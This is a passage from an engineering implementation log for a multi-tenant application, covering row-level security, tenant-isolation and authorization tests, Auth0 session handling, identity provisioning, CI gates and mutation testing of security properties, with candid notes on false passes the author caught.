**Redaction failure blocks the write.** There is no `force=True`. This matters more here than anywhere else: the store is append-only, so a leaked secret could not be deleted afterwards.

**`conservative` is a required argument on every flag, with no default.** A default would be a guess about which direction is safe, and it differs per flag — `new_solver_ui` is conservatively `False`, `require_consent` is conservatively `True`. The sub-step named the trap: "a flag service outage that enables a half-built feature is a far worse outcome than one that disables a finished one." A flag whose author has not decided which way is safe cannot be evaluated.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 TypeScript |
| Shell R7 | **12/12** |
| Isolation suite | 14 passed, 5 pending |
| Guard meta-suite | **36/36** |
| Migration 002 idempotent | Re-applied with 0 errors |
| Append-only | `UPDATE`/`DELETE`/`TRUNCATE` → `permission denied` |

**Mutation testing — 4/4 killed:** flags failing open on an outage, the redaction sweep removed, an audit write failure swallowed, and a malformed flag value coerced generously.

### Two real defects, found by tests rather than review
**`PRIMARY KEY (key, organization_id)` made the design impossible.** Primary key columns are implicitly `NOT NULL`, so the NULL-means-global row could never be inserted — the flag tests failed with a not-null violation. Replaced with a surrogate key plus two **partial** unique indexes, which also fixes a subtler problem: `(key, NULL)` is not unique under SQL NULL semantics, so two global rows for one key could have coexisted and made evaluation non-deterministic.

**A tuple containing a private key passed through `redact()` completely untouched.** `_redact_value` understands dict, list and str; a tuple fell through unchanged, and the safety sweep did not traverse tuples either. **The fail-closed branch was unreachable — decorative rather than protective.** The sweep now checks the string form of any type it does not understand, and a test proves it.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Wire emitters into request paths | STEP-004 |
| Audit volume and write-failure monitoring | STEP-024 |
| Admin console for flag changes | STEP-021 |
| Retention policy (needs `DEC-007`) | STEP-027 |

---

## IMPL-013 — STEP-002.06 — Cross-tenant isolation test suite

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-002 |
| Blast radius | [BR-016](blast-radius/BR-016-tenant-isolation-suite.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `2687bbe` — matched HEAD at pre-change |

### What was built
`tests/security/test_tenant_isolation.py` — 19 tests: 14 active, 5 pending. R7 now runs in pytest (the fast tier) as well as the shell suite from STEP-002.01.

| Vector | Coverage |
| --- | --- |
| Storage | Cross-tenant read, write and unbound listing all denied |
| Authorization | **Every operation × every role** against a foreign resource — 198 combinations, not sampled |
| Enumeration | Denial body carries no tenant, role or permission wording |
| Jobs | Payload round-trip; missing context raises; no ambient store to inherit |
| Events | Conflicting tenant refused; acting tenant stamped |
| Cache, outbox, export, vector store, graph | **Pending — see below** |

### Why this approach
**The pending vectors are the interesting part.** Five paths named by `REQ-SEC-002` have nothing to test: there is no cache, no outbox, no export, no vector store, no domain graph. The two easy options are both bad — omit them and they are forgotten, or write a test that passes vacuously, which is worse because it manufactures confidence.

Each unbuilt vector instead has a test that **detects whether its subsystem has landed**:

- not landed → `skip`, with the reason stated
- landed → **`fail`**, naming the subsystem and demanding a real test

A placeholder that cannot notice its own dependency arriving is just a comment. These convert themselves into failures.

**Two suites, deliberately overlapping at storage.** The shell suite proves the database in isolation and runs without Python; this one proves the path application code actually takes. Losing either loses a distinct guarantee.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 311 Python + 41 TypeScript |
| Shell R7 (STEP-002.01) | **12/12** |
| Guard meta-suite | **36/36** |
| mypy strict / ruff | Clean on 19 files |

**Pending-vector mechanism proven, not assumed.** Seeded a fake `cache.py` in `apps/api/src/` → the cache vector failed with *"The 'cache' subsystem now exists, but its cross-tenant isolation test is still a placeholder."* Created an `outbox` table → the outbox vector failed the same way. Removing both returned all five to skips.

**Mutation testing — 3/3 killed:** the tenant check removed from `authorize` (3 tests), the cross-tenant denial no longer marked `audit=True` (1 test), and a job payload defaulting instead of raising (1 test).

### The meta-test is the point
The suite disables the `memberships` RLS policy on purpose, asserts the storage vector then **leaks**, and restores it. Without that, every other assertion in the file could pass with row-level security switched off entirely — which is exactly the failure `BUG-007` produced at STEP-002.01, where a security suite reported passes while the schema was absent.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Cache isolation | STEP-010 |
| Outbox refusing unstamped/foreign envelopes | STEP-006 |
| Export isolation | STEP-015 / STEP-022 |
| Vector-store tenant scoping | STEP-010 |
| Graph traversal permission (`REQ-KG-006`) | STEP-026 |
| Persisting audit records for denials | STEP-002.07 |

---

## IMPL-012 — STEP-002.05 — Browser session, token refresh and guest sessions

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003 (**partial** — see below), REQ-PRIV-001 |
| Blast radius | [BR-014](blast-radius/BR-014-browser-session.md) (**HIGH**) |
| Decisions closed | **`DEC-004` → Auth0** (`ADR-013`); guest lifetime 7 days (`ADR-014`) |
| Commit | see git log for this entry |
| Graph indexed commit | `c58be3b` — matched HEAD at pre-change |

### What was built
The repository's **first TypeScript**: a minimal `apps/web` Next.js 16.2 package containing auth and nothing else — no design system, no layout, no pages. `STEP-003` builds the shell on top.

| Module | Responsibility |
| --- | --- |
| `auth/cookies.ts` | `__Host-` prefixed, httpOnly, Secure cookie policy |
| `auth/csrf.ts` | Double-submit token, deny-by-default on every non-safe method |
| `auth/guest.ts` | 7-day opaque bearer capability, hashed at rest, expiry enforced server-side |
| `auth/refresh.ts` | Single-flight refresh, per session key |
| `auth/oidc.ts` | The **only** file that knows about Auth0 |
| `auth/session.ts` | Composes the above; the file the sub-step names |

41 TypeScript tests. `pnpm test` now runs both suites.

### Why this approach
**The guarantee is the absence of a capability.** There is no function anywhere in this package that writes a token to `localStorage` or a JS-readable cookie. `tokenCookie()` throws if the name lacks the `__Host-` prefix and forces `httpOnly`. A developer in a hurry has nothing convenient to reach for, which is stronger than a rule asking them not to.

**Single-flight refresh is required by Auth0's rotation, not a performance tweak.** Rotation invalidates the previous refresh token the moment one is redeemed. Two concurrent refreshes therefore present a just-revoked token, Auth0 reads that as replay, and it can revoke the whole family — signing the user out. Without coalescing, concurrency logs users out.

**SameSite=Lax, not Strict.** A Strict session cookie is withheld on the top-level navigation back from the identity provider, so the user lands signed out immediately after signing in. Lax still blocks cross-site subrequests, and CSRF is covered independently by the double-submit token rather than resting on SameSite alone.

**Guest expiry is checked against the stored record, not the cookie.** A cookie `Max-Age` is a client-side hint an attacker replaying a captured token simply ignores.

### What is NOT delivered
**`REQ-SEC-003` is partial.** Two acceptance criteria are unmet:
- **Nothing has run against a live Auth0 tenant.** There is no account and no credentials in this repository. The flows are exercised against a spec-compliant OIDC shape; passkey enrolment, tenant rate limits and rotation under genuine concurrency are **unproven**.
- **"Auth flows keyboard and screen-reader complete" cannot be met** — there is no UI to test. Binds at STEP-003.

Guest session **storage** does not exist either: `validateGuestSession` takes the record as an argument and denies when it is `undefined`, so the logic is complete and fails closed, but nothing persists it yet.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** |
| Python tests | 292 passed |
| TypeScript tests | **41 passed** |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |

**Mutation testing — 7/7 killed:** token cookies made JS-readable, single-flight removed, IdP outage failing open, guest expiry ignored, CSRF allowing a missing header, PKCE downgraded to `plain`, and the OIDC `state` check skipped when the expected value is absent.

### Two guards stopped being vacuous
Since STEP-001, `typecheck.sh` and `module-boundaries.sh` had reported `PASS (vacuous): 0 TypeScript files`. This sub-step ended that, and `typecheck` immediately earned its keep by catching a real defect: `apps/web/package.json` had no `"type": "module"`, so TypeScript treated every file as CommonJS under `verbatimModuleSyntax`.

It then failed for a **wrong** reason — it ran `tsc -p tsconfig.base.json`, typechecking `apps/web` with the root's module settings instead of the package's own, producing errors that described a configuration mismatch rather than a defect. Rewritten to typecheck each package with its own config via `pnpm -r typecheck`, and — so that this does not become a new way to skip checking — it now **fails if a package contains TypeScript but declares no typecheck script**.

### Surprises
**`vi.fn<[Args], Return>()` is the vitest 2 signature**; v3 takes a function type. Caught by the typecheck guard on its first real run, which is a fair advertisement for it.

**pnpm 11 blocks install scripts by default.** `esbuild` and `sharp` needed explicit allowlisting. Rather than a blanket approval, `pnpm-workspace.yaml` now carries an `onlyBuiltDependencies` list where each entry has a stated reason — an install script is arbitrary code execution at dependency-install time.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Verify against a real Auth0 tenant; enrol a passkey | Before STEP-004 ships auth |
| Accessible sign-in UI (WCAG 2.2 AA) | STEP-003 |
| Guest session storage table | STEP-002.07 |
| Immediate revocation of an already-issued access token | STEP-002.07 |
| Route handlers and middleware that actually set these cookies | STEP-004 |

---

## IMPL-011 — STEP-002.04 — User, organization, invitation and service-account provisioning

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003 (satisfied), REQ-TRIP-005 (**partially** — see below) |
| Blast radius | [BR-013](blast-radius/BR-013-identity-provisioning.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `19a6037` at pre-change; HEAD moved to `972b93f` mid-sub-step (BUG-012 fix) |

### What was built
`services/identity/src/provisioning.py` — the first module under `services/`, establishing the layering between domain services and the `apps/api` boundary.

| Function | Guarantee |
| --- | --- |
| `provision_user` | Idempotent by IdP subject, arbitrated by the database |
| `create_guest_user` | Anonymous user with no `idp_subject` |
| `create_organization` | Organization + owner membership in one call |
| `grant_membership` / `revoke_membership` | Grant, reinstate, revoke — evidence retained |
| `active_role_keys` | The single place "is this membership live?" is decided |
| `register_service_identity` / `revoke_service_identity` | Workload identity, no credential parameter |
| `migrate_guest_to_account` | Replay-safe, with before/after counts |

16 integration tests against the real database (292 total).

### Why this approach
**Idempotency belongs to the database, not the application.** `provision_user` uses `INSERT … ON CONFLICT (idp_subject) DO UPDATE … RETURNING id, (xmax = 0)`. Check-then-insert loses the race between two concurrent first logins; `ON CONFLICT` lets the database arbitrate so the loser receives the winner's row instead of a second identity. A test runs two real concurrent connections and asserts one row and one id.

**`xmax = 0`** distinguishes an inserted row from an updated one, so the caller can tell first login from every later login without a second query.

**Revocation stamps `revoked_at`; it never deletes.** Deleting erases the evidence that access was once held, which is what an investigation needs. A test asserts the row survives revocation.

**No parameter can carry a secret.** REQ-SEC-003 forbids static long-lived keys. `register_service_identity` has nowhere to put one — a stronger guarantee than a policy asking people not to. Asserted by introspecting the function signature, so adding such a parameter breaks a test.

**Nothing here knows the identity provider.** `DEC-004` is open and §5 requires provider code to stay behind an interface. This module's only knowledge of the IdP is the opaque `idp_subject` string that `auth.claims.TokenVerifier` already produces.

### What this sub-step does NOT deliver
**`REQ-TRIP-005` is not satisfied.** It requires guest→account migration to yield exactly one copy of each trip. **There is no `trips` table** — trips arrive at STEP-007. What migrates today is memberships. The idempotency contract, the replay tests and the before/after reporting are built now so STEP-007 extends the same transaction rather than inventing the guarantee later, but the requirement must not be marked complete on this basis.

**Migration has no feature flag or dry-run**, which §11 requires. No flag system exists until STEP-024. `MigrationReport` provides the counts a dry-run would need; the flag does not exist. Stated, not glossed.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 18 Python files typechecked |
| Test suite | **292 passed** (was 276) |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean |

**Mutation testing — 7/7 killed:** removing `ON CONFLICT` (2 tests), migration losing `DO NOTHING`, migration not revoking source rows, revoke switching to `DELETE`, `active_role_keys` ignoring `expires_at`, ignoring `revoked_at`, and `create_organization` skipping the owner membership.

### Surprises and what they cost
**I claimed a schema gap that did not exist.** I reported that `users.idp_subject` had no unique constraint and demonstrated a "race" producing duplicate users. Both were wrong: `users_idp_subject_key` exists, and my `\d users` output had been truncated by `head -14`, cutting off the index list. The race demonstration then *disproved* my own claim — the second insert was rejected — which is how it was caught. Cost: one wrong conclusion stated confidently before it was checked.

**The schema was stricter than I assumed, again.** Migration 001 carries `users_identifiable_unless_guest` — a non-guest must have an `idp_subject` or an email. My hand-rolled test fixtures violated it. Fixed by building fixtures through `provision_user` instead of raw INSERTs, so a fixture cannot drift from the schema's own rules.

**`create_organization` cannot use a server-generated id.** The RLS policy is `WITH CHECK (id = app_current_org())`, so an organization may only be inserted when the transaction's tenant context already equals its id — the id must therefore exist before the INSERT. A server-generated default could not satisfy its own policy. Surprising enough to warrant a comment in the code.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Trip re-parenting — the actual REQ-TRIP-005 | STEP-007 |
| Feature flag + dry-run for migration | STEP-024 |
| Persist `AuditRecord` | STEP-002.07 |
| Revocation ending live sessions | STEP-002.05 |

---

## IMPL-010 — STEP-002.03 — Role and attribute policy definitions

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-004 (also REQ-ADMIN-002, REQ-COLL-003, REQ-LIVE-005) |
| Blast radius | [BR-012](blast-radius/BR-012-authorization-policy.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `d9be78b` — matched HEAD at pre-change |

### What was built
One authorization decision point covering all 22 operations.

| Module | Responsibility |
| --- | --- |
| `authz/roles.py` | 9 roles, 22 operations, `Rule` shape |
| `authz/matrix.py` | **Generated** 176-cell decision table |
| `authz/policy.py` | `authorize()` / `enforce()` — the only place a permission is decided |
| `tools/authz_matrix_source.py` | Markdown parser, shared by the generator and the drift gate |
| `tools/gen_authz_matrix.py` | Regenerates `matrix.py` from the matrix document |

247 new tests (276 total), including all 176 cells exercised individually.

### Why this approach
**The matrix generates the code, not just the tests.** The sub-step asked for matrix-driven tests. Generating the *table itself* goes one step further and removes the failure mode entirely: there is no hand-transcribed copy of 176 cells to get wrong. `AUTHORIZATION_MATRIX.md` §3 is now executable, and a drift test fails CI in both directions — edit the markdown without regenerating, or hand-edit the generated file, and the build breaks.

**Tenant is checked before role, deliberately.** A `trip_owner` in tenant A asking about tenant B's trip would otherwise pass the role check and fail later on relationship, and the audit record would read "relationship failure" instead of the truth. `ALRT-SEC-001` needs `cross_tenant_attempt` to be unambiguous, so the ordering is a security property and a test asserts the reason string.

**Conditional cells are not permissions.** A `⚠️` cell returns `allow=True` *with a condition*, and the evaluator denies unless the condition is proven. An unrecognised condition name also denies, so a typo in the matrix fails closed rather than granting access.

**`service` has no matrix column, so it is denied all 22 operations.** That is the matrix's own content, not an omission, and §4 requires exactly it ("no service holds a blanket admin role"). A test fails if a `service` column ever appears without review.

### Decisions this forced
| Decision | Resolution |
| --- | --- |
| `ADR-012` — the sub-step named `packages/authz/src/policy.ts`, TypeScript | Implemented in **Python**, co-located with enforcement. `REQ-SEC-004` demands server-side enforcement; the server is Python; a TS module would need an RPC hop inside the authorization path. The sub-step's own §8 says client-side checks are presentation only |
| `DEC-010` — `ops_admin` approving a high-impact override | **Unresolved, and left that way.** The matrix marks the cell conditional but never names the condition; §4's four-eyes rule names a *second curator*. Encoded as a condition nothing grants, so it **fails closed**, with a test pinning that behaviour |

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 16 Python files typechecked |
| Test suite | **276 passed** (was 29) |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean |

**Mutation testing — 6/6 killed:**

| Mutant | Caught by |
| --- | --- |
| Edit the matrix markdown, skip regeneration | drift gate |
| Hand-edit the generated `matrix.py` | drift gate + anchor cell + owner-only test |
| Deny-by-default becomes allow-by-default | 2 tests |
| Four-eyes same-actor check removed | 1 test |
| Unspecified condition silently allows | 3 tests |
| Guest expiry check removed | 1 test |

### Surprises and what they cost
**A mutant appeared to survive, and it was my measuring instrument that was broken.** Hand-editing the generated matrix reported "276 passed". The mutation had not applied: `ruff format` reflows the generated file so `Rule(` sits on its own line, and my `str.replace` pattern no longer matched. I nearly recorded a false gap as a finding. Re-run with a regex spanning the reflowed entry, three tests failed as they should.

This is the fourth instance of the same shape in this project — BUG-001's self-truncating guard, dependency-cruiser cruising zero modules, BUG-011's stub `test` script, and now a mutation harness that mutated nothing. **A negative result needs its own verification.** The fix here was cheap only because the mutation printed whether the substitution count was non-zero when I checked; that check should have been there from the start.

**The generator found a documentation gap by refusing to guess.** It raises on a conditional cell whose condition is not stated anywhere, which is how `DEC-010` surfaced. Nine `advisor` cells resolved from §4's delegation rule and one `privacy_operator` cell from §4's support-scoping rule; the eleventh had no rule to resolve against.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Make calling `authorize` structural, not conventional | STEP-004 |
| Audit sink for `audit=True` decisions | STEP-002.07 |
| Verify caller-asserted conditions (delegation, unlock, prior approver) | STEP-002.04 / STEP-021 |
| Answer `DEC-010` | Before STEP-021 |
| `ALRT-SEC-001` on `cross_tenant_attempt` | STEP-024 |

---

## IMPL-009 — STEP-002.02 — Tenant and actor context resolution at the API boundary

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-001, REQ-SEC-004 |
| Blast radius | [BR-011](blast-radius/BR-011-tenant-context-at-the-api-boundary.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | re-indexed post-commit — matched HEAD? yes |

### What was built
The repository's first application code: `apps/api/src/auth/`, six modules.

| Module | Responsibility |
| --- | --- |
| `claims.py` | `TokenClaims` (frozen) and the `TokenVerifier` **port** — `DEC-004` stays unbound |
| `context.py` | `RequestContext`, and explicit propagation across async/process boundaries |
| `dependencies.py` | The FastAPI dependency; reads only the `Authorization` header |
| `db.py` | Binds tenant to the transaction via `set_config(…, true)` |
| `errors.py` | One opaque denial shared by "forbidden" and "not found" |
| `events.py` | Stamps `tenant_id`/`actor_id` onto an event envelope |

29 tests in `tests/api/`, covering token-only resolution, ignored client hints, byte-identical denial, fail-closed job payloads, absence of ambient context, and — with the local stack up — real RLS enforcement through `bind_tenant`.

### Why this approach
**No ambient context.** There is deliberately no `get_current_context()`, no `ContextVar`, no thread-local. The sub-step named ambient state crossing an async boundary as the classic leak, so context is a value that must be passed, and the type checker enforces it at every call site. The ergonomic cost is real and accepted: ambient state is convenient precisely because it crosses boundaries you did not think about, which is the same property that makes it leak between tenants. A test asserts the ambient accessor has not been reintroduced.

**A verifier port, not a vendor.** `DEC-004` is open and binds at `STEP-002.04`. Hard-coding an OIDC library here would have decided it silently.

**`set_config` rather than `SET LOCAL`.** `SET LOCAL app.current_org = $1` is a syntax error — SET takes no bind parameters — so the obvious implementation formats a UUID into SQL on the tenancy boundary. `set_config('app.current_org', %s, true)` keeps it a bind parameter at the same transaction scope. Verified directly against PostgreSQL 18.4. Cost: one round trip per transaction.

**404 for both denial and absence.** A distinguishable 403 is an existence oracle across tenants. `opaque_denial()` takes no `reason` argument, because an optional detail parameter is exactly how indistinguishability erodes.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — and now actually runs the tests (`BUG-011`) |
| `tests/api/` | **29 passed** |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean on 8 files |

**Mutation testing — five security properties, each broken on purpose:**

| Mutant | Result |
| --- | --- |
| Trust `X-Tenant-Id` header | killed (2 tests) |
| Denial becomes 403 | killed (6 tests) |
| Denial body states a reason | killed (1 test) |
| `set_config(…, false)` — session-wide | **SURVIVED** → test added → now killed |
| Job payload defaults instead of raising | killed (2 tests) |

### Surprises and what they cost
**The surviving mutant was the most valuable result.** Making the binding session-wide instead of transaction-scoped — the pooled-connection leak — passed all 28 tests. R7 proves that property in raw SQL; nothing proved it for `bind_tenant`, which is the function application code actually calls. **A property proven at one layer is not proven at the layer above it.**

**A `422` that looked like a passing suite.** Switching to `Annotated[RequestContext, Depends(dependency)]` to satisfy ruff's B008 broke every route. With `from __future__ import annotations`, the annotation is a string that FastAPI resolves against **module** globals, but `dependency` is a local of the test's app factory; resolution fails and FastAPI silently reinterprets the parameter as a request field. This is a live hazard for `STEP-004` and is flagged in the test file.

**My own verification command hid it.** I checked with `pytest -q | grep -E '^\.|passed|failed' | tail -3`; the `^\.` matched the `.venv/…` warning path, so `tail -3` printed that instead of the result. The failure was visible and I filtered it out. Same family as the bugs this project keeps finding: the check was correct about the wrong thing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Enforce that jobs/activities carry context | STEP-006 |
| Outbox refuses an unstamped envelope | STEP-006 |
| Alerting on auth denials (`ALRT-SEC-001`) | STEP-024 |
| Confirm the graph indexes Python at all | post-commit re-index |

---

## IMPL-008 — STEP-002.01 — Postgres readiness race fix (BUG-009)

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-001, REQ-PLAT-001 |
| Blast radius | [BR-010](blast-radius/BR-010-postgres-readiness-race.md) (MEDIUM–HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | re-indexed post-commit — matched HEAD? yes |

### What was built
Two fixes, from re-verifying `STEP-002.01` against a **clean** database rather than trusting its recorded 12/12:

1. `docker-compose.dev.yml` — the Postgres healthcheck is now `pg_isready -h 127.0.0.1`. The entrypoint's first-boot temporary server listens on the Unix socket only, so a socket check went green against a server that was about to be shut down.
2. `tests/security/test_tenant_isolation.sh` — a connectivity probe now runs before the schema probe, so "cannot reach the database" is no longer reported as "tables missing".

### Why this approach
Adding a sleep or a retry loop would have hidden the race rather than removed it, and would have left every future service with the same faulty readiness signal. Checking the transport clients actually use makes the healthcheck structurally unable to pass early.

### Verification performed
| Check | Result |
| --- | --- |
| Three `down -v` → `up --wait` → R7 cold cycles | **12/12 each**; `--wait` now takes 6s |
| Race measured directly | socket=UP/tcp=down at 1250ms; socket=down/tcp=UP at 2000ms |

### Surprises
`STEP-002.01` was **not** wrong — but its 12/12 had only ever been observed against an already-running, already-seeded database. The result was true and was not evidence of what it appeared to prove. Steady-state verification cannot observe a startup race.

---

## IMPL-007 — STEP-002.01 — Identity schema and row-level security

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-SEC-001, REQ-SEC-002 |
| Blast radius | BR-008 (**HIGH**) |
| Graph indexed commit | `0cac408` — matched HEAD at pre-change |

### What was built
`db/migrations/001_identity_tenancy.sql` — organizations, users, roles, memberships, service identities, with RLS **enabled and forced**, a non-owner `journeylab_app` role carrying `NOBYPASSRLS`, and transaction-scoped tenant context via `SET LOCAL`. Plus `tests/security/test_tenant_isolation.sh`, which **establishes regression check R7**.

### Why this approach
Four decisions where the obvious option was weaker:

| Decision | Weaker alternative | Why |
| --- | --- | --- |
| `FORCE ROW LEVEL SECURITY` | `ENABLE` alone | Without FORCE the table owner bypasses every policy silently — the commonest way RLS is believed present but absent. Verified by test |
| `SET LOCAL` (transaction-scoped) | Session-level `SET` | A pooled connection would carry one tenant's context into another's transaction. Tested explicitly per `BR-008` §9 |
| Deny-by-default via NULL | Explicit deny policies | `app_current_org()` returns NULL when unset; every comparison is NULL, so **missing context denies access** rather than exposing everything |
| No column for a static service key | `secret` column | `REQ-SEC-003` — a credential that cannot be stored cannot be leaked |

Migration 001 sets the convention every later migration inherits, documented in its header.

### `DEC-004` is not blocking here
STEP-002 is blocked on the identity-provider decision, but **`.01` is not**: schema and RLS are provider-independent. `users.idp_subject` is a provider-neutral opaque string. `DEC-004` binds at `.04` (provisioning), confirmed by reading the sub-step files rather than assuming.

### What surprised us — a false pass in a security test
The suite's first run reported **3 passes for cross-tenant write denial while the tables did not exist**. Migration 001 had failed on missing `citext`, so every write errored — and `if <query>; then bad else ok` cannot tell a policy denial from a schema error.

That is the sixth instance in this repository of a check being correct about the wrong thing, and the most dangerous, because the subject was tenant isolation. Logged as `BUG-007` with three fixes: a precondition gate that ERRORs when the schema is absent, assertions on error *text* rather than exit code, and a self-contained migration.

The suite now carries its own meta-test: a weakened `USING (true)` policy must expose both tenants. It does — 2 rows — then the strict policy is restored and it returns 1. Without that, a suite passing against disabled RLS would look identical to one passing against working RLS.

### Follow-up created
| Item | Type |
| --- | --- |
| `ALRT-SEC-001` / `RB-SEC-001` not implemented — cross-tenant denials do not alert | Deferred to `STEP-024` (recorded in `BR-008` §5 category 11) |
| Migration runner (ordering, applied-tracking) | `STEP-006` |
| `DEC-004` identity provider | Open — binds at `.04` |

### Verification
| Check | Result |
| --- | --- |
| R7 isolation suite | **PASS — 12/12 assertions** |
| Suite meta-test (weakened policy exposes both tenants) | **PASS** |
| Migration idempotency (applied twice) | **PASS — 0 errors on re-run** |
| `pnpm verify` | PASS — 15 checks |

---

## IMPL-006 — STEP-001.06 — CI workflows and the change-impact merge gate

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-KG-003, REQ-KG-008 |
| Blast radius | BR-006 (MEDIUM) |
| Graph indexed commit | `e0062c2` — matched HEAD at pre-change |

### What was built
Three workflows (`verify`, `change-impact`, `knowledge-graph`), the enforcement gate `tests/guards/change-impact-record.sh`, and `tests/guards/workflow-refs.sh`.

### Why this approach
**The gate logic is a local script; the workflow is a thin caller.** A gate written only as workflow YAML cannot be verified until a PR exercises it — and an unverified gate is precisely the shape of `BUG-004`, where a guard was trusted before its scope was tested. Writing the logic locally made it meta-testable immediately.

This is the sub-step that converts `REQ-KG-008` from a rule people follow because they remember it into one the build enforces.

### Deliberate exemptions
Documentation, generated context files and lock-file-only refreshes are exempt. A gate that blocks legitimate work gets disabled, and a disabled gate is worse than none. The exemption branch is meta-tested, not assumed.

### What was verified — and what was not
| Claim | Evidence |
| --- | --- |
| Code without a record is blocked | Meta-test on a scratch branch: exit 1, cites `REQ-KG-008` |
| Docs-only changes pass | Meta-test: exemption branch taken, exit 0 |
| Incomplete record (no risk score) is blocked | Meta-test: exit 1, names the missing section |
| Workflow YAML parses; references resolve | `workflow-refs.sh`, meta-tested with a bogus script |
| **Workflows actually run on GitHub** | **NOT VERIFIED** — cannot execute Actions locally. The first PR is the real test |
| **10-minute refresh target met** | **NOT MEASURED** — no merge has run the workflow |

### Honest limitation in the graph workflow
The runner rebuilds the index rather than upserting a commit diff, because it starts with no `.gitnexus/` state. That satisfies the freshness *target* but not the incremental *design* in `INDEXING_AND_REFRESH` §5. True incremental refresh needs persisted index state and is deferred to `STEP-026`. Recorded in the workflow header, the design doc and here — not silently glossed.

### What surprised us
1. **Two meta-tests were invalid before they were right.** `git stash -u` and `git checkout` both removed the untracked guard script, so the harness reported exit 127 ("file not found") which I initially read as a gate verdict. Fixed by committing the guard first, then testing on a scratch branch. Same lesson as `BUG-004`: a test can fail for reasons that have nothing to do with what it claims to measure.
2. **`BUG-004`'s fix worked immediately.** The markup guard caught a stray tag in an untracked `BR-006` *before* commit — the identical defect that slipped through in `f80c8b3` one sub-step earlier.

### Verification
| Check | Result |
| --- | --- |
| Gate meta-tests (4 scenarios) | PASS |
| Workflow guard meta-test | PASS |
| `pnpm verify` (15 checks) | PASS |

---

## IMPL-005 — STEP-001.05 — README, architecture map and ADR files

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-004 |
| Blast radius | BR-005 (LOW) |
| Graph indexed commit | `23ec095` — matched HEAD at pre-change |

### What was built
`README.md` (orientation, prerequisites, setup, port table, repository map, data
classifications, working agreement, blockers); `docs/adr/` with **10 ADR files** plus
an index; ADR cross-links added to `DECISION_LOG`; and
`tests/guards/readme-accuracy.sh`.

### Why this approach
A README is the first thing a newcomer runs, so its failure mode is silent: it drifts,
and the reader concludes the documentation cannot be trusted. Rather than asserting it
is accurate, the guard **executes the claim** — every `pnpm` script it mentions must
exist, every link must resolve, every documented port must match
`docker-compose.dev.yml` in both directions, and the documented Node path must yield
v24.

ADRs were promoted from decision-log entries into files because a decision that lives
only inside a larger document cannot be reviewed, superseded or linked from a commit
message independently.

### Decisions taken during implementation
| Decision | Alternatives | Rationale |
| --- | --- | --- |
| Keep `ADR-NNN-<slug>.md` numbering | Rename to `0001-architecture.md` as `STEP-001` §18 listed | The step file's name predates ADR numbering. `ADR-001` is "documentation is the source of truth"; the architecture decision is `ADR-003`. Renumbering would break cross-references across ~100 documents and invalidate commit messages citing ADRs. **Step file corrected instead** |
| Guard checks ports **bidirectionally** | Only check README→compose | A port published but undocumented is as bad as one documented but unpublished |
| Guard does not run `pnpm verify` | Run full setup end to end | It is itself part of `pnpm verify` — that would recurse |

### The acceptance criterion I did not claim
The sub-step required *"an engineer who did not write the README completes setup using
it alone."* **I wrote it, so I cannot certify that.** The guard proves the commands are
correct and current; it cannot prove they are comprehensible to a newcomer.

Recorded as **partially satisfied**, with the human half outstanding. Marking it done
would have been the fourth false pass in this repository — the pattern each time is a
check that verifies something adjacent to, but not the same as, the actual claim.

### What surprised us
The `substep-docs` guard added in the previous sub-step **immediately blocked this
one**: I set `STEP-001.05` to `VERIFIED` before writing this entry, and `pnpm verify`
failed with *"1 missing record across 5 VERIFIED sub-steps"*. The guard written to
prevent `BUG-003` caught the same mistake one sub-step later. That is the clearest
evidence so far that these guards earn their cost.

### Follow-up created
| Item | Type |
| --- | --- |
| Newcomer walkthrough of the README | **Open** — needs a second person |
| ADR files for future decisions | Use `ADR_TEMPLATE`, index in `DECISION_LOG` |

### Verification
| Check | Result |
| --- | --- |
| README guard — scripts, links, ports, Node path | PASS |
| Guard meta-tests (bogus script, broken link, port mismatch) | PASS — all three caught, exit 1 each |
| 10 ADR files created and indexed | PASS |
| `pnpm verify` (14 checks) | PASS |

---

## IMPL-004 — STEP-001.04 — Local dependency stack

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-002 |
| Blast radius | BR-004 (LOW) |
| Graph indexed commit | `28923aa` — matched HEAD at pre-change |
| Commit | `8a9af9b` |

### What was built
